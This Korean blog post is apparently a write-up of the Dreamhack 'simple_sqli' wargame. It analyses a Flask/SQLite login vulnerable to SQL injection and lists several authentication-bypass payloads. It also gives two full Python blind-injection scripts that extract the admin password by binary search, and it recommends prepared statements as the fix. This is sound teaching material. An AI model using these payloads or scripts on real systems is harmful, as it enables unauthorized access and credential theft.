---
title: simple_sqli
description: Dreamhack [Wargame] - simple_sqli
author: juhyeongkim
date: 2024-10-31 00:00:00 +0900
categories: [Dreamhack, Wargame]
tags: [Dreamhack, Wargame, Web]
# toc: false
# comments: false
# math: true
# mermaid: true
# image:
# path: 
    # lqip: 
    # alt: 
---

[문제 링크](https://dreamhack.io/wargame/challenges/24)

{% raw %}

## 배경 지식

이번 문제는 `SQLite`를 이용하여 데이터베이스를 관리하고 있다.

[SQLite](https://www.sqlite.org/index.html)는 기존에 잘 알려진 `MySQL`, `MSSQL`, `Oracle` 등과 유사한 형태의 **DBMS**이다.

SQLite는 데이터 관리를 위한 일부 필수 기능만을 지원하기 때문에, 다른 DBMS에 비해 **비교적 경량화된** DBMS로 널리 알려져 있다.

따라서 SQLite는 많은 양의 컴퓨팅 리소스를 제공하기 어려운 임베디드 장비, 비교적 복잡하지 않은 독립실행형(Standalone) 프로그램에서 사용되며, 개발 단계의 편의성 또는 프로그램의 안전성을 제공한다.

<br>

## 문제 목표 및 기능 요약

`simple_sqli` 워게임의 목표는 관리자 계정으로 로그인하면 출력되는 `FLAG`를 획득하는 것이다. 워게임 사이트를 통해 서버에 접속해보면 간단한 로그인 기능만이 존재한다.

<img width="1016" alt="image" src="https://github.com/user-attachments/assets/5b34b38f-97f2-472b-9766-e1d23867db20">

|기능명|설명|
|-|-|
|`/login`|입력받은 ID/PW를 데이터베이스에서 조회하고 이에 해당하는 데이터가 있는 경우 로그인을 수행합니다.|

<br>

## 웹 서비스 분석

### 데이터베이스 스키마

```py
DATABASE = "database.db" # 데이터베이스 파일명을 database.db로 설정
if os.path.exists(DATABASE) == False: # 데이터베이스 파일이 존재하지 않는 경우,
    db = sqlite3.connect(DATABASE) # 데이터베이스 파일 생성 및 연결
    db.execute('create table users(userid char(100), userpassword char(100));') # users 테이블 생성
    # users 테이블에 guest와 admin 계정(row) 생성
    db.execute(f'insert into users(userid, userpassword) values ("guest", "guest"), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}");')
    db.commit() # 쿼리 실행 확정
    db.close() # DB 연결 종료
```

데이터베이스는 해당 `schema`를 통해 `database.db` 파일로 관리하고 있다.

위 코드를 살펴보면, 데이터 베이스 구조는 아래와 같다.

|users||
|-|-|
|`userid`|`userpassword`|
|guest|guest|
|admin|랜덤 16바이트 문자열을 Hex 형태로 표현 (32바이트)|

**`CREATE`를 통해** `userid`와 `userpassword` 칼럼을 가지는 `users` **테이블**을 생성해주고, **`INSERT`를 통해** 두 개의 **행**을 만들어준다.

여기서, `userid`가 `"admin"`인 행의 `userpassword`는 랜덤화된 데이터이기 때문에 SQL Injection을 사용하지 않고는 임의로 알아낼 수 없다.

<br>

### 엔드포인트 : **/login**

```py
# Login 기능에 대해 GET과 POST HTTP 요청을 받아 처리함
@app.route('/login', methods=['GET', 'POST'])
def login():
    # 이용자가 GET 메소드의 요청을 전달한 경우,
    if request.method == 'GET':
        return render_template('login.html') # 이용자에게 ID/PW를 요청받는 화면을 출력
    # POST 요청을 전달한 경우
    else:
        userid = request.form.get('userid') # 이용자의 입력값인 userid를 받은 뒤,
        userpassword = request.form.get('userpassword') # 이용자의 입력값인 userpassword를 받고
        # users 테이블에서 이용자가 입력한 userid와 userpassword가 일치하는 회원 정보를 불러옴
        res = query_db(
            f'select * from users where userid="{userid}" and userpassword="{userpassword}"'
        )

        if res: # 쿼리 결과가 존재하는 경우
            userid = res[0] # 로그인할 계정을 해당 쿼리 결과의 결과에서 불러와 사용

            if userid == 'admin': # 이 때, 로그인 계정이 관리자 계정인 경우
                return f'hello {userid} flag is {FLAG}' # flag를 출력

            # 관리자 계정이 아닌 경우, 웰컴 메시지만 출력
            return f'<script>alert("hello {userid}");history.go(-1);</script>'

        # 일치하는 회원 정보가 없는 경우 로그인 실패 메시지 출력
        return '<script>alert("wrong");history.go(-1);</script>'
```

#### GET

제일 처음에 본 `userid`와 `userpassword`를 입력할 수 있는 로그인 페이지를 제공한다.

#### POST

`form`을 통해 제출된 `userid`와 `userpassword`를 저장한 후, `query_db` 함수에 `f-string`을 통해 저장한 `userid`와 `userpassword`를 넣어준 후 함수를 호출하여 `res`에 리턴 값을 저장한다.

`query_db` 함수는 아래와 같다.

```py
def query_db(query, one=True): # query_db 함수 선언
    cur = get_db().execute(query) # 연결된 데이터베이스에 쿼리문을 질의
    rv = cur.fetchall() # 쿼리문 내용을 받아오기
    cur.close() # 데이터베이스 연결 종료
    return (rv[0] if rv else None) if one else rv # 쿼리문 질의 내용에 대한 결과를 반환

```

해당 함수를 호출하면, 데이터베이스에 인자로 전달한 쿼리문을 날리고, 쿼리문에 대한 응답을 `rv`에 저장한다.

`rv`는 쿼리문에 대한 응답을 저장하는 결과 리스트이며, 각 행이 `tuple` 형태로 저장된다. 

이번 문제에서는 `SELECT` 쿼리를 통해 테이블에서 특정 조건을 만족하는 행을 가져오는데, 로그인에서 가져오는 행은 1개이기 때문에 `one=True` 파라미터를 통해 **첫 번째 행**인 `rv[0]`을 가져오도록 하였다. (로그인이 실패하면 `rv`는 `None`일 것이다.)

여기서 `query_db`의 리턴 값이 `None`이 아니어서, `res`에 리턴 값(`rv[0]`)이 존재한다면, **해당 행의 첫 번째 컬럼에 저장된 값**인 `userid` 값을 `res[0]`을 통해 가져온다.

`userid`가 만약 `admin`이라면 `FLAG`를 출력하고, 아니라면 `hello {userid}`만 출력한다.

<br>

## 취약점 분석

해당 워게임에서 `query_db`에 쿼리문 인자를 전달할 때, `form`을 통해 이용자에게 입력 받은 `userid`와 `userpassword` 값을 쿼리문 내부에 포함하여 전달한다.

이렇게 동적으로 생성된 쿼리를 `RawQuery`라고 하는데, `RawQuery`를 생성할 때, **이용자의 입력 값이 쿼리문에 포함되면 SQL Injection 취약점에 노출될 수 있다고 하였다.**

이용자의 입력 값이 SQL Injection에 사용되는 SQL 쿼리문으로 해석될 수 있는지 검사하는 과정이 없기 때문에, `userid` 또는 `userpassword`에 공격자가 원하는 쿼리문이 실행되도록 쿼리문을 삽입하여 SQL Injection 공격을 수행할 수 있다.

SQL Injection으로 로그인 인증을 우회하여 로그인만 하는 방법이 있고, Blind SQL Injection을 통해 비밀번호를 알아낼 수 있는 방법도 존재한다.

<br>

### 1. SQL Injection

`userid`의 입력 값을 통해 쿼리문을 조작하여 `admin` 계정으로 로그인할 수 있도록, `query_db` 함수의 `rv[0]` 값이 `admin` 계정을 나타내는 행을 리턴하는 다양한 공격문을 아래와 같이 작성해볼 수 있다.

#### 1.

`userid` : `admin" --` 입력, 

`userpassword` : 아무 `random` 값이나 입력 

- `select * from users where userid="admin" --" and userpassword="random"`

#### 2.

`userid` : `admin" or 1"` 입력

`userpassword` : `random`

- `select * from users where userid="admin" or "1" and userpassword="random"`

참고로 주의할 점이, `userid`에 `admin" or 1 --`을 입력하면, 항상 참이 되어 모든 행을 가져오는데, `guest`가 테이블에서 첫 번째 행이므로 `rv[0]`이 `guest`를 리턴해서 `hello guest`가 출력된다.

`select * from users where userid="admin" or "1" and userpassword="random"`은 `select * from users where userid="admin" or userpassword="random"`으로 연산자 우선 순위에 의해 바뀌기 때문에 `"admin"`계정의 행이 리턴되게 된다.

`and` 연산자의 우선 순위가 `or`보다 높아서 `("1" and userpassword="random")`가 먼저 계산되어 `userpassword="random"`으로 합쳐지기 때문이다.

#### 3.

`userid` : `random` 입력

`userpassword` : `random" or userid="admin` 입력

- `select * from users where userid="random" AND userpassword="random" or userid="admin"`

앞에서 설명한 연산자 우선 순위에 의해 `AND` 부분부터 연산되는데, 해당 결과는 `FALSE`이므로 결국 `userid="admin"`인 행만 리턴하게 된다.

#### 4.

`userid` : `random` 입력

`userpassword` : `random" or 1 LIMIT 1, 1 --` 입력

- `select * from users where userid="random" or 1 LIMIT 1,1--" and userpassword="random"`

앞에서 설명한 것처럼, `or 1`에 의해 테이블의 행이 전부 리턴되면, 첫 번째 행에는 `guest`가 존재하고 두 번째 행에는 `admin`이 존재하기 떄문에 `LIMIT 1, 1`으로 두 번째 행을 반환하도록 설정하면 된다.

`LIMIT`의 첫 번째 인자는 `시작 인덱스`이고, 두 번째 인자는 `리턴할 행의 개수`이다. (`0-index`)

#### 5.

이렇게 여러 쿼리문을 통해 SQL Injection 공격을 수행하면 아래와 같이 `FLAG`를 `return` 하여 출력하게 된다.

<img width="504" alt="image" src="https://github.com/user-attachments/assets/bcb7e330-17ee-4624-bd44-a43bb01e5991">

`simple_sqli` 문제를 통해 **이용자의 입력값이 실행할 쿼리문에 포함될 경우** 발생할 수 있는 취약점에 대해서 알아보았다.

이러한 문제점은 이용자의 입력값이 포함된 쿼리를 동적으로 생성하고 사용하면서 발생한다.

따라서 SQL 데이터를 처리할 때 쿼리문을 직접 생성하는 방식이 아닌 **Prepared Statement**와 **Object Relational Mapping (ORM)** 을 사용해 취약점을 보완할 수 있습니다.

**Prepared Statement**는 동적 쿼리가 전달되면 내부적으로 쿼리 분석을 수행해 안전한 쿼리문을 생성한다.

<br>

### 2. Blind SQL Injection

이번엔 `users` 테이블에 저장되어 있는 `userpassword` 값을 읽는 Blind SQL Injection 자동화 코드를 작성하여 익스플로잇을 해보자.

비밀번호를 구성할 수 있는 문자의 개수를 출력 가능한 아스키 문자로 제한했을 때, 한 자리에 들어갈 수 있는 문자의 종류는 94개이다. (`0x20 ~ 0x7E`)

만약 비밀번호의 경우의 수를 생각해본다면, 비밀번호가 10자리인 경우 총 `94^10` 개의 경우의 수가 존재하기 때문에 이를 모두 조사하는 것은 거의 불가능하다.

하지만 우리는 모든 경우의 수를 찾아보는게 아니라, **한 자리씩 검증하기 때문에 최대 `940 = 94 x 10`개의 쿼리문**으로 비밀번호를 찾아낼 수 있다.

`Binary Search`를 이용하면 $\log_{2} 940$ 으로 `65`개의 쿼리문으로 훨씬 축소된다.

65개의 쿼리 정도면 적어보일 수 있지만, 이 또한 수동으로 계속 쿼리문을 날리는 것보단 자동화 스크립트를 작성하여 쿼리문을 날리는 것이 훨씬 효율적일 것이다.

#### 1. 로그인 요청의 폼 구조 파악

자동화 스크립트에 쿼리문을 작성하려면, 로그인할 때 전송하는 `POST` 데이터의 구조를 파악해야 한다. 과정은 아래와 같다.

##### 1.

개발자 도구의 `Network` 탭을 열고, `Preserve log` 클릭 (`Preserve log`는 페이지를 이동하거나 새로고침해도 네트워크 로그들을 지우지 않고 유지해줌)

<img width="1540" alt="image" src="https://github.com/user-attachments/assets/05875111-0d4e-4a25-8f4e-0cd875aa47e8">

##### 2.

`userid`와 `userpassword`에 "guest"를 입력 후 Login 버튼 클릭

##### 3.

Network 탭의 메시지 목록에서 `POST` 요청 찾기 (`GET`은 폼 데이터가 존재하지 않음)

<img width="702" alt="image" src="https://github.com/user-attachments/assets/760b792e-136d-4748-830b-b528586a42cf">

##### 4.

`Payload`에서 `Form Data` 구조 확인

<img width="699" alt="image" src="https://github.com/user-attachments/assets/76eb756e-915b-423c-9836-3f858c70fcd5">

해당 과정을 통해 `app.py` 코드에서도 확인할 수 있지만, **코드가 없을 경우 로그인 할 때 입력되는 값이 `userid` 필드와 `userpassword` 필드로 전송되는 것을 확인할 수 있다.**

<br>

#### 2. 비밀번호 길이 파악

비밀번호를 알아내기 위해 비밀번호가 최대 몇자리로 이루어져있는지 확인해야한다. 이를 위해서 아래와 같이 `Binary Search`를 통해 `"admin"` 계정의 비밀번호 길이를 찾아내는 파이썬 스크립트를 작성할 수 있다.

```py
#!/usr/bin/python3
import requests
import sys
from urllib.parse import urljoin


class Solver:
    """Solver for simple_SQLi challenge"""
    
    # initialization
    def __init__(self, port: str) -> None:
        self._chall_url = f"http://host3.dreamhack.games:{port}"
        self._login_url = urljoin(self._chall_url, "login")
        
    # base HTTP methods
    def _login(self, userid: str, userpassword: str) -> bool:
        login_data = {
            "userid": userid,
            "userpassword": userpassword
        }
        resp = requests.post(self._login_url, data=login_data)
        return resp

    # base sqli methods
    def _sqli(self, query: str) -> requests.Response:
        resp = self._login(f"\" or {query}-- ", "hi")
        return resp
        
    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
        while 1:
            mid = (low+high) // 2
            if low+1 >= high:
                break
            query = query_tmpl.format(val=mid)
            if "hello" in self._sqli(query).text:
                high = mid
            else:
                low = mid
        return mid
        
    # attack methods
    def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
        query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{{val}})"
        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
        return pw_len
        
    def solve(self):
        pw_len = solver._find_password_length("admin")
        print(f"Length of admin password is: {pw_len}")
        
        
if __name__ == "__main__":
    port = sys.argv[1]
    solver = Solver(port)
    solver.solve()
```

과정을 한번 살펴보면, 먼저 `_find_password_length`에서 `query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{{val}})"`를 통해 쿼리문을 생성한다.

참고로, `f-string`으로 문자열을 선언할 때 `{user}` 처럼 `{}`을 한번만 감싸주면 선언과 동시에 `user` 값이 존재하여 대입이 이루어져야 하고, `{{val}}` 처럼 `{{}}`로 두번 감싸주면 중괄호 그대로 `{val}`이 문자열로 저장된다. (`{}`가 `'`나 `"`와 비슷하다고 생각하면 됨)

`val`을 `{val}`로 출력되도록 하는 이유는, 나중에 이진 탐색 함수에서 `format()` 함수를 통해 `val`의 값을 계속 바꿔줄 것이기 때문이다.

다시 쿼리문에 대해서 설명하면, 해당 쿼리문은 `userpassword`의 길이(`LENGTH`)가 `val`보다 작은 경우 `True`를 리턴하는 쿼리문이다. 예를 들어 `user`가 `"admin"`이고, `val`이 `10`일 때 아래와 같은 쿼리문이 실행된다.

- `((SELECT LENGTH(userpassword) WHERE userid="admin") < 10)`

이 쿼리문을 `_sqli_lt_binsearch` 함수에 인자로 전달하면, 해당 함수에서 `val` 값을 `mid` 값의 변화에 따라 바꿔가며 이진 탐색을 하게 된다.

이진 탐색 함수에서 `_sqli` 함수를 호출하여 `resp = self._login(f"\" or {query}-- ", "hi")`를 통해 앞에서 쓴 쿼리문을 `query`에 입력하여 전달해주면, 전달해준 `query`가 `True`인 경우, `or True`가 되어 로그인이 가능하게 된다.

참고로, `_sqli` 함수는 `-> requests.Response`에서도 볼 수 있듯이, `_login` 함수에서 `requests.post`를 호출하여 리턴되는 값인 `resp`(`requests.Response`)를 리턴한다.\
(`Response` 객체에는 `text`, `cookies`, `header`, `status_code` 등 여러가지 필드가 존재한다.)

따라서, 쿼리문이 `True`를 리턴하는 경우 `"hello ~~"가 출력되기 때문에, `if "hello" in self._sqli(query).text:` 조건으로 해당 함수의 응답문에서 `"hello"` 라는 텍스트가 존재하면 로그인에 성공한 것으로 판단한다.

이 경우 우리가 `< val` 조건을 썼기 때문에, `high = mid`로 업데이트 하여 `val`의 값을 줄여보며 이진 탐색을 진행하여 비밀번호 길이를 찾게 된다.

코드의 실행 결과는 아래와 같고, `app.py` 소스코드에서도 16바이트 랜덤한 문자열을 만든 후 `hex`로 출력했기 때문에, 비밀번호의 길이가 총 32자리(32바이트)임을 알 수 있다.

<img width="730" alt="image" src="https://github.com/user-attachments/assets/4574a70f-c3a3-4319-b485-7c25b0fe89ac">

<br>

#### 3. 비밀번호 찾기

이제 비밀번호의 길이를 찾았기 때문에, 구한 비밀번호의 길이까지 한 글자씩 비밀번호를 알아내는 코드를 작성해보자. `Binary Search`를 활용한 자동화 스크립트 코드는 아래와 같다.

```py
#!/usr/bin/python3
import requests
import sys
from urllib.parse import urljoin


class Solver:
    """Solver for simple_SQLi challenge"""

    # initialization
    def __init__(self, port: str) -> None:
        self._chall_url = f"http://host3.dreamhack.games:{port}"
        self._login_url = urljoin(self._chall_url, "login")

    # base HTTP methods
    def _login(self, userid: str, userpassword: str) -> requests.Response:
        login_data = {"userid": userid, "userpassword": userpassword}
        resp = requests.post(self._login_url, data=login_data)
        return resp

    # base sqli methods
    def _sqli(self, query: str) -> requests.Response:
        resp = self._login(f'" or {query}-- ', "hi")
        return resp

    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
        while 1:
            mid = (low + high) // 2
            if low + 1 >= high:
                break
            query = query_tmpl.format(val=mid)
            if "hello" in self._sqli(query).text:
                high = mid
            else:
                low = mid
        return mid

    # attack methods
    def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
        query_tmpl = f'((SELECT LENGTH(userpassword) WHERE userid="{user}") < {{val}})'
        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
        return pw_len

    def _find_password(self, user: str, pw_len: int) -> str:
        pw = ""
        for idx in range(1, pw_len + 1):
            query_tmpl = f'((SELECT SUBSTR(userpassword,{idx},1) WHERE userid="{user}") < CHAR({{val}}))'
            pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x2F, 0x7E))
            print(f"{idx}. {pw}")
        return pw

    def solve(self) -> None:
        # Find the length of admin password
        pw_len = solver._find_password_length("admin")
        print(f"Length of the admin password is: {pw_len}")
        # Find the admin password
        print("Finding password:")
        pw = solver._find_password("admin", pw_len)
        print(f"Password of the admin is: {pw}")


if __name__ == "__main__":
    port = sys.argv[1]
    solver = Solver(port)
    solver.solve()
```

비밀번호를 찾는 코드는 이진 탐색으로 찾은 비밀번호의 길이를 인자로 전달하여, `_find_password` 함수에서 `substr`와 이진 탐색을 사용하여 비밀번호를 한 자리씩 찾아간다.

`query_tmpl = f'((SELECT SUBSTR(userpassword,{idx},1) WHERE userid="{user}") < CHAR({{val}}))'`를 통해 `userpassword`에서 지정해준 `substr`이 `val`의 아스키 문자보다 작을 때 `TRUE`를 리턴하는 쿼리문을 발생시킨다.

비밀번호의 자릿수를 나타내는 `idx`는 1부터 인자로 전달된 비밀번호 자릿수까지 증가시켜주며, 이진 탐색 결과로 찾은 비밀 번호의 아스키 문자 값을 `pw +=`으로 더하여 누적해준다.

예를 들어, 세 번째 문자에 대해 `user`가 `"admin"`이고 `val`이 `'a'`를 나타내는 `0x61`이면 아래와 같은 쿼리문을 보낸다.

- `(SELECT SUBSTR(userpassword,3,1) WHERE userid="admin") < CHAR(0x61)`

이진 탐색의 과정은 비밀 번호의 길이를 찾는 과정과 동일하기 때문에 같은 함수를 사용한다. 여기서 `mid`는 아스키 문자의 정수 값으로 설정된다.

코드의 실행 결과는 아래와 같고, 찾은 비밀번호를 통해 로그인하면 로그인에 성공한다. `app.py` 소스코드에서도 16바이트 랜덤한 문자열을 만든 후 `hex`로 출력했기 때문에, 총 32바이트 길이의 비밀번호가 나온다.

<img width="699" alt="image" src="https://github.com/user-attachments/assets/3e2613fb-dc14-46a7-916f-fa8d80691438">

참고로 만약 실행하다가, **Connection timed out** 연결 시간 초과 에러가 발생하면, `try...except` 구문으로 에러를 핸들링하거나, 공격에 성공할 때 까지 스크립트를 계속 실행하여 해결하는 방법이 있다.
{% endraw %}